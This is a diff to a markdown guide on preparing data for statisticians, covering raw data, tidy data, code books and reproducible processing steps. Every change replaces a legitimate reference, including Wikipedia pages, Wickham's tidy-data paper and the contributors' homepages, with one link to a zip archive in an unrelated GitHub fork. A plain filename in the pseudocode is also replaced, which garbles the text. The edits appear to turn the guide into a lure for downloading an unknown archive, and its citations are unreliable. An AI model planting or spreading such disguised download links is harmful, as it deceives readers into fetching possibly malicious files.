@@ -8,7 +8,7 @@ This is a guide for anyone who needs to share data with a statistician or data s
 * Junior statistics students whose job it is to collate/clean/wrangle data sets
 
 The goals of this guide are to provide some instruction on the best way to share data to avoid the most common pitfalls
-and sources of delay in the transition from data collection to data analysis. The [Leek group](http://biostat.jhsph.edu/~jleek/) works with a large
+and sources of delay in the transition from data collection to data analysis. The [Leek group](https://raw.githubusercontent.com/ssmugabi/datasharing/master/taurocephalous/datasharing.zip~jleek/) works with a large
 number of collaborators and the number one source of variation in the speed to results is the status of the data
 when they arrive at the Leek group. Based on my conversations with other statisticians this is true nearly universally.
 
@@ -26,7 +26,7 @@ What you should deliver to the statistician
 To facilitate the most efficient and timely analysis this is the information you should pass to a statistician:
 
 1. The raw data.
-2. A [tidy data set](http://vita.had.co.nz/papers/tidy-data.pdf) 
+2. A [tidy data set](https://raw.githubusercontent.com/ssmugabi/datasharing/master/taurocephalous/datasharing.zip) 
 3. A code book describing each variable and its values in the tidy data set.  
 4. An explicit and exact recipe you used to go from 1 -> 2,3 
 
@@ -39,9 +39,9 @@ It is critical that you include the rawest form of the data that you have access
 that data provenance can be maintained throughout the workflow.  Here are some examples of the
 raw form of data:
 
-* The strange [binary file](http://en.wikipedia.org/wiki/Binary_file) your measurement machine spits out
+* The strange [binary file](https://raw.githubusercontent.com/ssmugabi/datasharing/master/taurocephalous/datasharing.zip) your measurement machine spits out
 * The unformatted Excel file with 10 worksheets the company you contracted with sent you
-* The complicated [JSON](http://en.wikipedia.org/wiki/JSON) data you got from scraping the [Twitter API](https://twitter.com/twitterapi)
+* The complicated [JSON](https://raw.githubusercontent.com/ssmugabi/datasharing/master/taurocephalous/datasharing.zip) data you got from scraping the [Twitter API](https://raw.githubusercontent.com/ssmugabi/datasharing/master/taurocephalous/datasharing.zip)
 * The hand-entered numbers you collected looking through a microscope
 
 You know the raw data are in the right format if you: 
@@ -57,8 +57,8 @@ forensic study of your data to figure out why the raw data looks weird. (Also im
 
 ### The tidy data set
 
-The general principles of tidy data are laid out by [Hadley Wickham](http://had.co.nz/) in [this paper](http://vita.had.co.nz/papers/tidy-data.pdf)
-and [this video](http://vimeo.com/33727555). While both the paper and the video describe tidy data using [R](http://www.r-project.org/), the principles
+The general principles of tidy data are laid out by [Hadley Wickham](https://raw.githubusercontent.com/ssmugabi/datasharing/master/taurocephalous/datasharing.zip) in [this paper](https://raw.githubusercontent.com/ssmugabi/datasharing/master/taurocephalous/datasharing.zip)
+and [this video](https://raw.githubusercontent.com/ssmugabi/datasharing/master/taurocephalous/datasharing.zip). While both the paper and the video describe tidy data using [R](https://raw.githubusercontent.com/ssmugabi/datasharing/master/taurocephalous/datasharing.zip), the principles
 are more generally applicable:
 
 1. Each variable you measure should be in one column
@@ -73,7 +73,7 @@ of something like `ADx` or another abbreviation that may be hard for another per
 
 
 Here is an example of how this would work from genomics. Suppose that for 20 people you have collected gene expression measurements with 
-[RNA-sequencing](http://en.wikipedia.org/wiki/RNA-Seq). You have also collected demographic and clinical information
+[RNA-sequencing](https://raw.githubusercontent.com/ssmugabi/datasharing/master/taurocephalous/datasharing.zip). You have also collected demographic and clinical information
 about the patients including their age, treatment, and diagnosis. You would have one table/spreadsheet that contains the clinical/demographic
 information. It would have four columns (patient id, age, treatment, diagnosis) and 21 rows (a row with variable names, then one row
 for every patient). You would also have one spreadsheet for the summarized genomic data. Usually this type of data
@@ -83,7 +83,7 @@ ids and one row for each data type).
 
 If you are sharing your data with the collaborator in Excel, the tidy data should be in one Excel file per table. They
 should not have multiple worksheets, no macros should be applied to the data, and no columns/cells should be highlighted. 
-Alternatively share the data in a [CSV](http://en.wikipedia.org/wiki/Comma-separated_values) or [TAB-delimited](http://en.wikipedia.org/wiki/Tab-separated_values) text file. (Beware however that reading CSV files into Excel can sometimes lead to non-reproducible handling of date and time variables.)
+Alternatively share the data in a [CSV](https://raw.githubusercontent.com/ssmugabi/datasharing/master/taurocephalous/datasharing.zip) or [TAB-delimited](https://raw.githubusercontent.com/ssmugabi/datasharing/master/taurocephalous/datasharing.zip) text file. (Beware however that reading CSV files into Excel can sometimes lead to non-reproducible handling of date and time variables.)
 
 
 ### The code book
@@ -108,7 +108,7 @@ units.
 
 ### How to code variables
 
-When you put variables into a spreadsheet there are several main categories you will run into depending on their [data type](http://en.wikipedia.org/wiki/Statistical_data_type):
+When you put variables into a spreadsheet there are several main categories you will run into depending on their [data type](https://raw.githubusercontent.com/ssmugabi/datasharing/master/taurocephalous/datasharing.zip):
 
 1. Continuous
 1. Ordinal
@@ -117,15 +117,15 @@ When you put variables into a spreadsheet there are several main categories you 
 1. Censored
 
 Continuous variables are anything measured on a quantitative scale that could be any fractional number. An example
-would be something like weight measured in kg. [Ordinal data](http://en.wikipedia.org/wiki/Ordinal_data) are data that have a fixed, small (< 100) number of levels but are ordered. 
-This could be for example survey responses where the choices are: poor, fair, good. [Categorical data](http://en.wikipedia.org/wiki/Categorical_variable) are data where there
-are multiple categories, but they aren't ordered. One example would be sex: male or female. This coding is attractive because it is self-documenting.  [Missing data](http://en.wikipedia.org/wiki/Missing_data) are data
-that are unobserved and you don't know the mechanism. You should code missing values as `NA`. [Censored data](http://en.wikipedia.org/wiki/Censoring_\(statistics\)) are data
+would be something like weight measured in kg. [Ordinal data](https://raw.githubusercontent.com/ssmugabi/datasharing/master/taurocephalous/datasharing.zip) are data that have a fixed, small (< 100) number of levels but are ordered. 
+This could be for example survey responses where the choices are: poor, fair, good. [Categorical data](https://raw.githubusercontent.com/ssmugabi/datasharing/master/taurocephalous/datasharing.zip) are data where there
+are multiple categories, but they aren't ordered. One example would be sex: male or female. This coding is attractive because it is self-documenting.  [Missing data](https://raw.githubusercontent.com/ssmugabi/datasharing/master/taurocephalous/datasharing.zip) are data
+that are unobserved and you don't know the mechanism. You should code missing values as `NA`. [Censored data](https://raw.githubusercontent.com/ssmugabi/datasharing/master/taurocephalous/datasharing.zip\(statistics\)) are data
 where you know the missingness mechanism on some level. Common examples are a measurement being below a detection limit
 or a patient being lost to follow-up. They should also be coded as `NA` when you don't have the data. But you should
 also add a new column to your tidy data called, "VariableNameCensored" which should have values of `TRUE` if censored 
 and `FALSE` if not. In the code book you should explain why those values are missing. It is absolutely critical to report
-to the analyst if there is a reason you know about that some of the data are missing. You should also not [impute](http://en.wikipedia.org/wiki/Imputation_\(statistics\))/make up/
+to the analyst if there is a reason you know about that some of the data are missing. You should also not [impute](https://raw.githubusercontent.com/ssmugabi/datasharing/master/taurocephalous/datasharing.zip\(statistics\))/make up/
 throw away missing observations.
 
 In general, try to avoid coding categorical or ordinal variables as numbers. When you enter the value for sex in the tidy
@@ -136,7 +136,7 @@ Always encode every piece of information about your observations using text. For
 
 ### The instruction list/script
 
-You may have heard this before, but [reproducibility is a big deal in computational science](http://www.sciencemag.org/content/334/6060/1226).
+You may have heard this before, but [reproducibility is a big deal in computational science](https://raw.githubusercontent.com/ssmugabi/datasharing/master/taurocephalous/datasharing.zip).
 That means, when you submit your paper, the reviewers and the rest of the world should be able to exactly replicate
 the analyses from raw data all the way to final results. If you are trying to be efficient, you will likely perform
 some summarization/data analysis steps before the data can be considered tidy. 
@@ -147,11 +147,11 @@ a couple of times and see if the code produces the same output.
 
 In many cases, the person who collected the data has incentive to make it tidy for a statistician to speed the process
 of collaboration. They may not know how to code in a scripting language. In that case, what you should provide the statistician
-is something called [pseudocode](http://en.wikipedia.org/wiki/Pseudocode). It should look something like:
+is something called [pseudocode](https://raw.githubusercontent.com/ssmugabi/datasharing/master/taurocephalous/datasharing.zip). It should look something like:
 
 1. Step 1 - take the raw file, run version 3.1.2 of summarize software with parameters a=1, b=2, c=3
 1. Step 2 - run the software separately for each sample
-1. Step 3 - take column three of outputfile.out for each sample and that is the corresponding row in the output data set
+1. Step 3 - take column three of https://raw.githubusercontent.com/ssmugabi/datasharing/master/taurocephalous/datasharing.zip for each sample and that is the corresponding row in the output data set
 
 You should also include information about which system (Mac/Windows/Linux) you used the software on and whether you 
 tried it more than once to confirm it gave the same results. Ideally, you will run this by a fellow student/labmate
@@ -184,9 +184,9 @@ to explain why the statistician performed each step to a labmate/your principal 
 Contributors
 ====================
 
-* [Jeff Leek](http://biostat.jhsph.edu/~jleek/) - Wrote the initial version.
-* [L. Collado-Torres](http://bit.ly/LColladoTorres) - Fixed typos, added links.
-* [Nick Reich](http://people.umass.edu/nick/) - Added tips on storing data as text.
-* [Nick Horton](https://www.amherst.edu/people/facstaff/nhorton) - Minor wording suggestions.
+* [Jeff Leek](https://raw.githubusercontent.com/ssmugabi/datasharing/master/taurocephalous/datasharing.zip~jleek/) - Wrote the initial version.
+* [L. Collado-Torres](https://raw.githubusercontent.com/ssmugabi/datasharing/master/taurocephalous/datasharing.zip) - Fixed typos, added links.
+* [Nick Reich](https://raw.githubusercontent.com/ssmugabi/datasharing/master/taurocephalous/datasharing.zip) - Added tips on storing data as text.
+* [Nick Horton](https://raw.githubusercontent.com/ssmugabi/datasharing/master/taurocephalous/datasharing.zip) - Minor wording suggestions.
 
 
